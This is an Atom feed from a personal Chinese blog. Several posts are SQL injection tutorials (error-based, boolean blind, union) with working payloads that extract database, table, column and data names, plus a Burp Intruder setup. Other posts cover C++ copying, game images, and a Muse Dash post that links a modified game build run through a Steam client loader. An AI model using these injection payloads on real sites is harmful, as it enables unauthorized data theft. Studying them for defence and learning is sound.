<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Robin</title>
  
  <subtitle>LiuGuobin&#39;s blog</subtitle>
  <link href="https://liu1272.github.io/atom.xml" rel="self"/>
  
  <link href="https://liu1272.github.io/"/>
  <updated>2023-03-12T04:15:17.647Z</updated>
  <id>https://liu1272.github.io/</id>
  
  <author>
    <name>liuGuobin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL报错注入</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-12T03:37:00.000Z</published>
    <updated>2023-03-12T04:15:17.647Z</updated>
    
    <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在公司开发项目是通常程序开发期间需要告诉使用者某些报错信息，方便程序员进行调试修复，定位文件错误，而且开发中会经常使用异常处理函数，捕获错误信息，比如在PHP中使用mysql_error()函数。如果SQL注入存在时，会有报错信息返回就可以采用报错注入进行攻击啦！！！</p><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>报错注入嘛，首先肯定要让它报错呀。<br>那么什么时候才会报错呢？</p><pre><code>Xpath语法错误     extractvalue(1,(concat(0x7e,(payload),0x7e)))     updatexml(1,(concat(0x7e,(payload),0x7e)))     0x7e这个十六进制数代表符号~，~这个符号在xpath语法中是不存在的，因此总能报错     详细的使用方法请自行查找数据溢出错误     exp(x)     当参数x超过710时，exp()函数会报错主键重复错误     floor(x)：     count()和group by遇到rand()产生的重复值时报错函数特性报错     使用name_const来制造一个列     mysql列名重复会报错参数类型报错(不写了，自己找去)</code></pre><p>现在有了报错，怎么利用？<br>忘记了那个and和or语句了吗？<br>把SQL语句放到产生报错的语句中，<br>再将原本要传入的参数和上面已经结合起来的语句用and合为payload。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><h5 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h5><pre><code>?id=1&#39; -- a</code></pre><p>老一套了，直接拿来用。</p><h5 id="判断是否是报错注入"><a href="#判断是否是报错注入" class="headerlink" title="判断是否是报错注入"></a>判断是否是报错注入</h5><pre><code>?id=1&#39; and updatexml(1,&#39;~&#39;,3) -- a</code></pre><p>如果报错了那说明是的，这里可以多换几个函数。<br>要让前面一半正常执行！</p><h5 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h5><pre><code>?id=-1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(schema_name)        from information_schema.schemata)    , 1 , 31)),3) -- a</code></pre><p>一样的，函数自己换<br>但是注意高版本数据库基本上都没有这个漏洞了<br>尽管这样，一旦有漏洞就能用这个库跑了</p><h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(table_name)        from information_schema.tables        where table_schema = &#39;库名&#39;)    , 1 , 31)),3) -- a</code></pre><h5 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h5><pre><code>?id=1&#39; and updatexml(1,concat(&#39;~&#39;,    substr(         (select group_concat(column_name)        from information_schema.columns        where table_schema = &#39;库名&#39; and table_name = &#39;表名&#39;)    , 1 , 31)),3) -- a</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h4&gt;&lt;p&gt;数据库在执行时，遇到语法不对，会显示报错信息，比如错误语句:select’&lt;/p&gt;
&lt;h4 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; cl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL布尔盲注(延时注入后面再写)</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
    <published>2023-03-12T02:39:00.000Z</published>
    <updated>2023-03-12T03:36:37.119Z</updated>
    
    <content type="html"><![CDATA[<h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。<br>或者为真时返回正常页面，为假时跳转到其它页面等。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在后端的PHP代码中，对你传入的数据进行了处理并判断<br>判断是True或False会执行不同代码</p><h4 id="开始注入-二分法"><a href="#开始注入-二分法" class="headerlink" title="开始注入(二分法)"></a>开始注入(二分法)</h4><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><p>使用一些判断真假的语句来进行判定<br>当它是数字型时:</p><pre><code>1&#39; and 1=0 --+1&#39; and 1=1 --+</code></pre><p>如果第一个与第二个回显不一样那么可能是布尔盲注<br>但是不排除有些丧心病狂的扑街预判了你的预判<br>这时候修改为不常见的数值（如1352=1352等）</p><p>当它是字符串型注入时:</p><pre><code>1&#39; and &#39;1&#39;=&#39;114514 --+1&#39; and &#39;1&#39;=&#39;666 --+</code></pre><h5 id="猜数据库名长度"><a href="#猜数据库名长度" class="headerlink" title="猜数据库名长度"></a>猜数据库名长度</h5><p>这个应该很好理解吧，既然它不告诉你有啥，那你就自己猜咯。<br>刚刚好又有and可以判断语句，是不是天无绝人之路？</p><pre><code>1&#39; and (length(database()))&gt;x--+</code></pre><p>当报错的时候就说明数据库名字长度是x-1了嘛</p><h5 id="猜数据库名（ASCII码）"><a href="#猜数据库名（ASCII码）" class="headerlink" title="猜数据库名（ASCII码）"></a>猜数据库名（ASCII码）</h5><pre><code>1&#39; and ascii(substr(database(),1,1))&gt;100--+1&#39; and ascii(substr(database(),1,1))&lt;150--+</code></pre><p>这样子一直用二分法来缩小数据库名的ASCII码范围直到求出最终值。<br>是不是很麻烦？是就对了！<br>现在是告诉你注入原理，不看就滚犊子。</p><h5 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h5><pre><code>1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100--+1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;150--+</code></pre><p>方法其实是和前面的联合查询注入一样的，多了个二分法而已<br>其实拿SQLmap和BP跑也是差不多的原理，只是自动化注入罢了</p><h5 id="猜字段名"><a href="#猜字段名" class="headerlink" title="猜字段名"></a>猜字段名</h5><pre><code>1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&gt;50--+1&#39; and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),1,1)))&lt;80--+</code></pre><p>还是一样的</p><h5 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h5><pre><code>1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&lt;80--+1&#39; and (ascii(substr(( select  id users limit 0,1),1,1)))&gt;30--+</code></pre><p>仍然是一样的</p><h4 id="开始注入-字符判断法"><a href="#开始注入-字符判断法" class="headerlink" title="开始注入(字符判断法)"></a>开始注入(字符判断法)</h4><p>数据库名字长度的判断跟上面的的一样<br>对每一位猜解都要写很多次判断语句<br>判断这些字符数字</p><pre><code>0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.@_</code></pre><h4 id="使用Burp-Suite注入"><a href="#使用Burp-Suite注入" class="headerlink" title="使用Burp_Suite注入"></a>使用Burp_Suite注入</h4><p>由于手工进行一一判断，工作量较大，可使用Burp_Suite中的字典进行。<br>1、抓包并将数据包传送到intruder<br>2、对对应位置进行上面提到的字符数字爆破:</p><pre><code>http://192.168.162.128/?id=1&#39; and if(SUBSTRING(database(),$1$,1)=$d$,1,0)–+&amp;Submit=Submit#</code></pre><p>payload set中分别设置并开始attack:<br>number类型，从1到数据库名字长度，步长为1<br>simple list类型，导入字符数字的字典</p><p><em><strong>后面的同理，自己举一反三吧</strong></em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表现&quot;&gt;&lt;/a&gt;表现&lt;/h4&gt;&lt;p&gt;在测试中不会展现任何数据库报错内容，但是网页中真和假有着不同的回显。&lt;br&gt;或者为真时返回正常页面，为假时跳转到其它页面等。&lt;/p&gt;
&lt;h4</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL联合注入</title>
    <link href="https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
    <id>https://liu1272.github.io/2023/03/12/SQL%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</id>
    <published>2023-03-11T16:47:00.000Z</published>
    <updated>2023-03-12T02:21:28.447Z</updated>
    
    <content type="html"><![CDATA[<h3 id="SQL联合注入"><a href="#SQL联合注入" class="headerlink" title="SQL联合注入"></a>SQL联合注入</h3><h4 id="表现"><a href="#表现" class="headerlink" title="表现"></a>表现</h4><p>有回显且可进行联合查询</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>SQL中union select查询的方式将结果合在一起，并删除重复的数据。这就是联合查询。</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>1、判断是否存在注入点<br>（1）修改参数值，查看数据是否改变<br>（2）插入单、双引号的检测方法，未闭合的单引号会有报错</p><p>2、判断注入点是整形还是字符型<br>（1）数字型：通过</p><pre><code>and 1=1</code></pre><p>（2）字符串型：闭合单引号测试语句</p><pre><code>&#39;and&#39;1&#39;=&#39;1</code></pre><p>3、判断查询列数</p><pre><code>select username,password from where username=&#39;root&#39; and password=123 order by x</code></pre><p>当输入x报错时，真实的列数是「x-1」<br>(1)为什么用order by 可以证明前面语句查询了三列数据呢？<br>&emsp;&emsp;select * from order by (你要按照排序的对象)<br>&emsp;&emsp;order by可以按照指定的「字段名」排序<br>&emsp;&emsp;还可以按照「索引」进行排序，索引就是从左至右将列名按照123排序<br>&emsp;&emsp;对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1<br>&emsp;&emsp;当输入的索引溢出时它就会报错。<br>(2)我们为什么要知道前面查询了多少语句呢？<br>&emsp;&emsp;因为union前面查询语句查询的元素与后面查询语句查询的元素要在数量上一样<br>&emsp;&emsp;select 甲,乙,丙 union select 1,2,3<br>&emsp;&emsp;因为前面查询的语句有三个元素（甲，乙，丙）<br>&emsp;&emsp;所以后面查询的语句必须是三个元素（1，2，3）</p><p>4、找到显示位</p><pre><code>?id=-1 union select 1,2,3,4,5,6 --+</code></pre><p>如果在使用UNION SELECT 1,2,3…,11 from table时，网页中显示了信息8<br>那么说明网页只能够显示第8列中信息，不能显示其他列的信息。<br>也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。<br>所以如果我们想要知道某个属性的值，比如admin；<br>就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。<br>但是为了爆出第一位后面的显示位需要隐藏正常结果<br>比如将id=1改为id=-1，使union前面的语句报错，执行后面的，爆出显示位</p><p>5、利用显示位获取库名</p><pre><code>select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</code></pre><p>在高版本中查询该表就行，具体看上一篇文章。<br>group_concat()函数将所有查询的库名连在一起成为一条数据</p><pre><code>?id=-1&#39; union select 1,database(),3 --+</code></pre><p>假设判断出在2号位显示，那么在二号位换成想插入的SQL语句就行了。<br>相同的，这里也要让union前面的语句报错，执行后面的。</p><p>6、获取表名</p><pre><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;库名&#39; --+</code></pre><p>相同的，这里也要让union前面的语句报错，执行后面的。<br>group_concat()函数将所有查询的表名连在一起成为一条数据</p><p>7、查询表中列名</p><pre><code>?id=-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; --+</code></pre><p>数据库有个information_schema库，里面有个columns表，存有整个数据库的列名。<br>我们要去查找的列，就是在这个库中去找。</p><p>8、获取字段信息</p><pre><code>?id=-1’ union select 1,group_concat(列名),3 from 库名.表名 --+</code></pre><p>平平无奇，跟上面的没啥不同，等价于下面这条</p><pre><code>?id=-1’ union select 1,列名,3 from 库名.表名 limit 0,1 --+</code></pre><h4 id="联合查询注入是最简单的了，一定要完全看懂"><a href="#联合查询注入是最简单的了，一定要完全看懂" class="headerlink" title="联合查询注入是最简单的了，一定要完全看懂"></a>联合查询注入是最简单的了，一定要完全看懂</h4><h3 id="黑盒，白盒，灰盒测试"><a href="#黑盒，白盒，灰盒测试" class="headerlink" title="黑盒，白盒，灰盒测试"></a>黑盒，白盒，灰盒测试</h3><h4 id="黑盒测试（测试功能）"><a href="#黑盒测试（测试功能）" class="headerlink" title="黑盒测试（测试功能）"></a>黑盒测试（测试功能）</h4><p>黑盒测试是以用户的角度，从输入数据与输出数据的对应关系出发进行测试的。<br>目的是检测程序是否能适当地接收输入数据而产生正确的输出信息。<br>很明显，如果外部特性本身设计有问题或规格说明的规定有误，用黑盒测试方法是发现不了的。</p><h4 id="白盒测试（优化程序）"><a href="#白盒测试（优化程序）" class="headerlink" title="白盒测试（优化程序）"></a>白盒测试（优化程序）</h4><p>以开发者的角度，对程序内部细节的严密检验</p><h4 id="灰盒测试（修复bug）"><a href="#灰盒测试（修复bug）" class="headerlink" title="灰盒测试（修复bug）"></a>灰盒测试（修复bug）</h4><p>多用于集成测试阶段，不仅关注输出、输入的正确性，同时也关注程序内部的情况。<br>灰盒测试不像白盒那样详细、完整，但又比黑盒测试更关注程序的内部逻辑。<br>常常是通过一些表征性的现象、事件、标志来判断内部的运行状态。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;SQL联合注入&quot;&gt;&lt;a href=&quot;#SQL联合注入&quot; class=&quot;headerlink&quot; title=&quot;SQL联合注入&quot;&gt;&lt;/a&gt;SQL联合注入&lt;/h3&gt;&lt;h4 id=&quot;表现&quot;&gt;&lt;a href=&quot;#表现&quot; class=&quot;headerlink&quot; title=&quot;表</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入前置知识及注入原理</title>
    <link href="https://liu1272.github.io/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"/>
    <id>https://liu1272.github.io/2023/03/11/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</id>
    <published>2023-03-11T15:09:00.000Z</published>
    <updated>2023-03-12T04:17:35.174Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>BurpSuite的及其拓展的安装及使用<br>SQLmap的下载及基本命令<br>了解少许PHP语言<br><strong>不断尝试的热情！</strong>                    </p><h4 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h4><h5 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h5><p>由于SQL语言是结构化查询语言(是操作数据库的语言,不懂的自己找我之前的文章)可以据库进行增、删、改、查等操作。<br>又因为程序员写的PHP代码不严谨，导致访问提交数据时，我们可以把代码提交到后台数据库，后台数据库处理这些数据时这些数据插入或拼接在一起形成了SQL语句命令，最后这个SQL语句可以被后台数据库作为恶意代码执行，从而达到你想达到的注入效果。</p><h5 id="SQL注入三要素"><a href="#SQL注入三要素" class="headerlink" title="SQL注入三要素"></a>SQL注入三要素</h5><p><em><strong>未严格过滤（没开waf等防护）<br>允许恶意修改（具有一定权限）<br>执行语句（能够闭合并执行的合法SQL语句）</strong></em></p><h5 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h5><p>按照注入时的表现来区分:<br>boolean-based blind – 布尔盲注<br>error-based – 报错注入<br>time-base blind – 延时注入<br>UNION query – 联合查询注入<br>堆叠查询注入</p><p>按照注入点区分:<br>字符型<br>数字型</p><p>按照提交数据方式来区分:<br>GET注入<br>POST注入<br>Cookie注入<br>HTTP头部注入</p><h5 id="注入测试一般流程"><a href="#注入测试一般流程" class="headerlink" title="注入测试一般流程"></a>注入测试一般流程</h5><pre><code>(1)寻找注入点:可通过web扫描工具实现；        是否存在注入并且判断注入类型(2)利用注入点:尝试通过注入获得各种信息，越多越好；(3)数据处理:猜解关键数据库表及其重要字段与内容；        猜解SQL查询语句的字段数        确定回显点        查询数据库信息        查询用户名，数据库名(4)后续攻击:通过获取的用户信息，寻找后台登录并利用后台或了解的进一步信息。        文件读取        写入shell</code></pre><h4 id="一些杂七杂八的拓展知识"><a href="#一些杂七杂八的拓展知识" class="headerlink" title="一些杂七杂八的拓展知识"></a>一些杂七杂八的拓展知识</h4><pre><code>在MySQL5.0版本以后MySQL数据库中会默认存放一个information_schema的数据库，在该数据库中，我们需要记住三个表名，分别是schemata，tables，columns。schemata表字段schema_name记录着数据库的库名；tables表字段table_schema和table_nmae分别记录着数据库中的库名和表名；columns表字段table_schema和table_name以及columns_name分别记录着数据库的库名、表名、字段名；select 原始查询内容 union select 构造的内容两者下一级的个数必须保持一致select * from order by 你要按照排序的对象对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1limit 一个一个打印出来group_concat 一次性全部打印group_concat()函数将同一组的列显示出来，相当于爆出该数据库的全部表concat_ws(分隔符，str1，str2，……)函数同时显示多个字段，并以分隔符分开concat(str1，str2，str3，…)函数同时显示多个字段，其中有一个字段为null，则返回nullSQL语句结尾加上limit 0,1表示一个一个输出前面的语句的结果0x20是空格常用函数:length()                # 返回字符串的长度substring()                        substr()                # 截取字符串mid()left()                    # 从左侧开始取指定字符个数的字符串concat()                    # 没有分隔符的连接字符串concat_ws()              # 含有分割符的连接字符串group_conat()           # 连接一个组的字符串ord()                    # 返回ASCII 码ascii()    hex()                    # 将字符串转换为十六进制unhex()                    # hex 的反向操作md5()                    # 返回MD5 值floor(x)                # 返回不大于x 的最大整数round()                    # 返回参数x 接近的整数rand()                    # 返回0-1 之间的随机浮点数load_file()                # 读取文件，并返回文件内容作为一个字符串sleep()                    # 睡眠时间为指定的秒数if(true,t,f)            # if 判断find_in_set()            # 返回字符串在字符串列表中的位置benchmark()                # 指定语句执行的次数</code></pre><h4 id="较难理解的注释语句"><a href="#较难理解的注释语句" class="headerlink" title="较难理解的注释语句"></a>较难理解的注释语句</h4><pre><code>#和-- 表示注释，可以使它们后面的语句不被执行(--后有个空格)get请求解释执行的时候，url中#号是锚点，所以HTTP请求中使用#闭合无法注释。而-- 在传输过程中--与后面的单引号连接在一起，也无法形成有效的mysql语句。那么要启动空格的作用就需要在--后面加上一点字符，比如+或&#39;(因为+会被解释成空格)当然，也可以使用--%20，把空格转换为urlencode编码格式，也不会报错。同理把#变成%23,也不报错。如果是post请求，则可以直接使用#来进行闭合。常见的就是表单注入，如在后台登录框中进行注入。另外#后面可以有空格，也可以没有(sql就是这么规定的，记住就行了)</code></pre><h5 id="最后哔哔一句，如果你丫这都看不懂，那你别学了。"><a href="#最后哔哔一句，如果你丫这都看不懂，那你别学了。" class="headerlink" title="最后哔哔一句，如果你丫这都看不懂，那你别学了。"></a>最后哔哔一句，如果你丫这都看不懂，那你别学了。</h5>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h4&gt;&lt;p&gt;BurpSuite的及其拓展的安装及使用&lt;br&gt;SQLmap的下载及基本命令&lt;br&gt;了解少许PHP语言&lt;br&gt;&lt;strong</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>拷贝相关</title>
    <link href="https://liu1272.github.io/2023/03/09/%E6%8B%B7%E8%B4%9D%E7%9B%B8%E5%85%B3/"/>
    <id>https://liu1272.github.io/2023/03/09/%E6%8B%B7%E8%B4%9D%E7%9B%B8%E5%85%B3/</id>
    <published>2023-03-09T14:49:00.000Z</published>
    <updated>2023-03-09T15:04:25.321Z</updated>
    
    <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h5 id="本篇文章简要记录一下C-拷贝相关的知识以及误区。"><a href="#本篇文章简要记录一下C-拷贝相关的知识以及误区。" class="headerlink" title="本篇文章简要记录一下C++拷贝相关的知识以及误区。"></a>本篇文章简要记录一下C++拷贝相关的知识以及误区。</h5><p>   <strong>首先上定义:</strong><br>   拷贝和浅拷贝是指在对对象一份复制或者复制某些部分时所表现出来的差异。</p><p>   浅拷贝只复制对象的引用，由于是引用，所以当拷贝对象中的属性变化时，原始对象和拷贝对象共享这些属性的变化，也就是说，拷贝对象的属性变化会影响到原始对象的属性。因为是浅拷贝，所以拷贝的对象和原来的对象不是两个的独立存在，而是共享数据存储空间。</p><p>   深拷贝则是在复制对象的指针引用的同时，完全复制一份内容相同的对象。也就是说，深度拷贝会创建一个新的对象，而不仅仅是拷贝其指针引用，因此，它们的变化互不影响。人们可以自由操作两个对象，而不会对另一个产生影响。因此，深拷贝能够完整地承载原对象所有信息。这个复制后的对象与原对象彻底分离，内存空间也不同了。</p><p>   简单地说:浅拷贝会影响原有的数据，相当于做了路径引用；深拷贝是另外开辟了内存空间，相当于复制了一个。</p><p>   <strong>然后是一个比较大的误区(可能是我比较菜所以搞不懂):</strong><br>   使用指针传递值是浅拷贝。</p><p>   当使用指针传递值时，函数参数传递的是指针所指向的内存地址，而不是实际的变量本身。因此，函数内部对于指针所指向的数据进行的操作，会直接影响到原始数据，属于浅拷贝。</p><p>   如果需要进行深拷贝，可以使用其他方式，比如使用引用传递或者复制构造函数等。</p><p><strong>上代码才看得懂！</strong></p><pre class="line-numbers language-c++"><code class="language-c++">指针可以直接访问和修改原数据的地址，从而实现更改原数据。具体操作步骤如下：1. 定义指针变量并初始化为原数据的地址：int data = 10;int* pData = &data;2. 通过指针访问和修改原数据：*pData = 20;  // 将原数据修改为20完整示例代码如下：#include <iostream>using namespace std;int main() &#123;    int data = 10;    int* pData = &data;    cout << "原数据：" << data << endl;    *pData = 20;    cout << "更改后的数据：" << data << endl;    return 0;&#125;输出结果为：原数据：10更改后的数据：20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="今天就这么多，写作业去了。"><a href="#今天就这么多，写作业去了。" class="headerlink" title="今天就这么多，写作业去了。"></a>今天就这么多，写作业去了。</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;每日一记&quot;&gt;&lt;a href=&quot;#每日一记&quot; class=&quot;headerlink&quot; title=&quot;每日一记&quot;&gt;&lt;/a&gt;每日一记&lt;/h3&gt;&lt;h5 id=&quot;本篇文章简要记录一下C-拷贝相关的知识以及误区。&quot;&gt;&lt;a href=&quot;#本篇文章简要记录一下C-拷贝相关的知识以及</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Arcaea</title>
    <link href="https://liu1272.github.io/2023/03/08/Arcaea/"/>
    <id>https://liu1272.github.io/2023/03/08/Arcaea/</id>
    <published>2023-03-07T16:05:00.000Z</published>
    <updated>2023-03-08T16:13:09.309Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Final-Verdict"><a href="#Final-Verdict" class="headerlink" title="Final Verdict"></a>Final Verdict</h3><p><img src="https://s2.loli.net/2023/03/09/hOT6eWV85gIwX1j.jpg" alt="第一个必须得是咲弥！"><br><img src="https://s2.loli.net/2023/03/09/NKS61Q3PV8spoIL.jpg" alt="光光怎么哭了呜呜呜"><br><img src="https://s2.loli.net/2023/03/09/zNcPyYS5qmhxXnR.jpg" alt="我可怜的光光"><br><img src="https://s2.loli.net/2023/03/09/gHa1KlTMLGfrCsx.jpg" alt="牵着我的手"><br><img src="https://s2.loli.net/2023/03/09/g6T9YwRuFqBNoHL.jpg" alt="目视崩溃的未来"><br><img src="https://s2.loli.net/2023/03/08/1SqIAni59T7bZ8y.png" alt="贴贴"><br><img src="https://s2.loli.net/2023/03/08/dU8i4P1BxQuTSCt.png" alt="Arcaea的残骸"><br><img src="https://s2.loli.net/2023/03/08/QGgLYvEh7TeakJI.png"><br><img src="https://s2.loli.net/2023/03/08/4ki3oUOtQI2FyRn.png"><br><img src="https://s2.loli.net/2023/03/08/cCpUPTDjX4KLrHi.png" alt="尾声"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Final-Verdict&quot;&gt;&lt;a href=&quot;#Final-Verdict&quot; class=&quot;headerlink&quot; title=&quot;Final Verdict&quot;&gt;&lt;/a&gt;Final Verdict&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.</summary>
      
    
    
    
    <category term="图片" scheme="https://liu1272.github.io/categories/%E5%9B%BE%E7%89%87/"/>
    
    
    <category term="图片" scheme="https://liu1272.github.io/tags/%E5%9B%BE%E7%89%87/"/>
    
  </entry>
  
  <entry>
    <title>喵斯？快跑！</title>
    <link href="https://liu1272.github.io/2023/03/05/%E5%96%B5%E6%96%AF%E5%BF%AB%E8%B7%91%EF%BC%81/"/>
    <id>https://liu1272.github.io/2023/03/05/%E5%96%B5%E6%96%AF%E5%BF%AB%E8%B7%91%EF%BC%81/</id>
    <published>2023-03-04T17:39:00.000Z</published>
    <updated>2023-03-04T18:24:17.353Z</updated>
    
    <content type="html"><![CDATA[<h5 id="这篇文章就是来吐槽musedash的！"><a href="#这篇文章就是来吐槽musedash的！" class="headerlink" title="这篇文章就是来吐槽musedash的！"></a>这篇文章就是来吐槽musedash的！</h5><p>该死的喵斯，你单单靠自己频繁的联动是注定无法长久地保存音游圈的流量的！<br>首先，那个该死的只能228软妹币一次性买断的曲包机制，<br>以及在各个平台的同一账号购买记录不互通就足够烦恼了。<br>然后，更难受的还得是资源封锁。<br>人家Phigros和Arcaea都有各自在民间广泛流传的自制谱渠道。<br>燃鹅你游官方不给就算了，还任由某个小团体封锁自制的资源。<br>甚至有考核乐理和游戏排行来决定玩家是否能够拥有写谱的资格。<br><strong>对此我只能说是离谱至极！</strong><br>自制铺面本应是趁兴而为。<br>但是，我为了导入一首I Got Smoke不得不加了三个喵斯群，一个考核群。<br>最后还是自己花了6个小时在互联网上找到各方零散资源，<br>再自行尝试修改才成功的。<br>如此可见，如果一个热爱喵斯而实力不强的玩家遇到这种情况，<br>那么将会是一盆冷水浇个透心凉！</p><p>下面的图你们自己看看吧。<br><img src="https://s2.loli.net/2023/03/05/fhio3NYLdr8bFHt.png" alt="载入mdmc"><br><img src="https://s2.loli.net/2023/03/05/Esnuw7XrcQkVjAq.png" alt="最后有折磨多"><br><img src="https://s2.loli.net/2023/03/05/f1KrcBpDX65T7Ow.png" alt="终于搞定了"></p><p>这里是阿里云盘的<a href="https://www.aliyundrive.com/s/UqrJ8R732JC">分享链接</a>，提取码是4qt8</p><p>下面是使用教程:<br>1.“下崽”并解压至没有中文的路径比如桌面(问为什么的找GPT去)<br>2.双击MuseDash文件夹里的那个steamclient_loader文件<br>3.千万不要点MuseDash这个应用程序(你爱试就逝咯)<br>4.如果成功运行，按Q找西瓜图标的自定义包就行了<br>5.如果卡了或命令行卡在下载某个zip文件那就Ctrl+C一下<br>6.实在不行就双击解压出来的另一个文件，选择MuseDash这个应用程序然后漫长等待。<br>7.上一步需要科学上网<br>8.如果按上面做都不行就去该博客GitHub仓库找我。</p><h5 id="不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。"><a href="#不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。" class="headerlink" title="不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。"></a>不写每日一句了，下午还有个会议，晚上有晚自习。早点睡了。</h5>]]></content>
    
    
      
      
